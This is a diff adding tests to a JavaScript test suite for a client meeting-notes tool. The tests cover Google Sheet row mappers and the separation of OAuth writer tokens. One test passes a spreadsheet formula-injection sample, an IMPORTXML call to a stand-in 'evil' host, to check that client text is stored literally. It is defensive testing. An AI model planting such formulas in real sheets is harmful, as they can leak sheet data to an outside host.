@@ -380,6 +380,55 @@ ok("comments lane sits above the meetings lane's early exits",
   pollerSrc.indexOf("await pollComments") < pollerSrc.indexOf('"  nothing new"') ||
   pollerSrc.indexOf("await pollComments") < pollerSrc.indexOf("nothing new"));
 
+/* --------------------------------------------------------------- master sheet rows
+ * The 2026-08-12 action item was "a centralized document to store and populate client meeting
+ * notes" — a real Sheet, created and appended to, not a CSV feed someone has to wire up. The
+ * row mappers are pure, so the column contract is testable without touching Google. */
+console.log("\nmaster sheet");
+const { noteRow, commentRow, TABS } = await import("./targets/master-sheet.js");
+const { WRITER_SCOPES, WRITER_PREFIX, subjects: subjFn, writerSubject } = await import("./sources/google-auth.js");
+
+const nr = noteRow({
+  said_at: "2026-08-12T10:00:00Z", brand: "ARMRA", kind: "action_item", title: "Send revised concepts",
+  detail: "by Thursday", evidence: [{ quote: "Thursday's tight but yes, Thursday.", speaker: "Kyle Fenerty" }],
+}, "ARMRA — creative review");
+ok("note row matches the Meeting Notes columns", nr.length === TABS["Meeting Notes"].length);
+ok("  ...date first, client second", nr[0] === "2026-08-12" && nr[1] === "ARMRA");
+ok("  ...carries the exact quote and speaker", nr[5].startsWith("Thursday's tight") && nr[6] === "Kyle Fenerty");
+ok("  ...marks a quoted item as reliable", nr[8].startsWith("yes"));
+ok("AI-summary rows are marked NOT reliable",
+  noteRow({ kind: "gemini_notes", title: "x", evidence: [] }, "m")[8].startsWith("NO"));
+ok("a missing client reads as — not blank", noteRow({ kind: "decision", title: "x", evidence: [] }, "m")[1] === "—");
+
+const cr = commentRow({
+  created_time: "2026-08-11T09:00:00Z", brand: "Huckleberry", file_name: "Huckleberry: Ad Concepts",
+  doc_kind: "slides", author: "Erich Detert", author_role: "client",
+  content: 'avoid using "Sleep Coach"', anchored_to: "Sleep Coach", resolved: false,
+  replies: [{ author: "Kyle", content: "done" }], web_link: "https://x",
+});
+ok("comment row matches the Client Comments columns", cr.length === TABS["Client Comments"].length);
+ok("  ...slides read as 'ad concept' in plain words", cr[3] === "ad concept");
+ok("  ...keeps what the comment was left on", cr[7] === "Sleep Coach");
+ok("  ...flattens replies into one readable cell", cr[9] === "Kyle: done");
+ok("  ...open vs resolved is a word, not a boolean", cr[8] === "open");
+
+// A formula in client text must never execute in the sheet. The API is told RAW, and these rows
+// are passed through untouched — no apostrophe hack needed, unlike the CSV path.
+ok("row values are passed through literally (RAW handles formulas)",
+  commentRow({ content: "=IMPORTXML(\"http://evil\",\"//x\")", replies: [] })[6] === '=IMPORTXML("http://evil","//x")');
+
+// Writer tokens must never be mistaken for capture tokens: they hold drive.file and would see
+// nothing to poll, so a stray one in the store would produce an empty, confusing poll pass.
+const twoKinds = { GOOGLE_TOKENS_FILE: join(tmpdir(), `mt-writer-${Date.now()}.json`) };
+saveRefreshToken("eric@creativeadbundance.com", "rt1", twoKinds);
+saveRefreshToken(WRITER_PREFIX + "carl@creativeadbundance.com", "rt2", twoKinds);
+ok("capture subjects exclude the writer token", subjFn(twoKinds).join() === "eric@creativeadbundance.com");
+ok("the writer is found by its own lookup", writerSubject(twoKinds) === WRITER_PREFIX + "carl@creativeadbundance.com");
+ok("writer consent asks for drive.file, not blanket spreadsheets",
+  /drive\.file/.test(WRITER_SCOPES) && !/auth\/spreadsheets/.test(WRITER_SCOPES));
+ok("  ...and never asks for drive.readonly on top", !/drive\.readonly/.test(WRITER_SCOPES));
+try { (await import("node:fs")).rmSync(twoKinds.GOOGLE_TOKENS_FILE, { force: true }); } catch {}
+
 /* --------------------------------------------------------------- dashboard is not broken
  * The dashboard is one HTML file with an inline <script>. Nothing type-checks it, no build step
  * touches it, and a single stray character takes the WHOLE page down silently — the browser
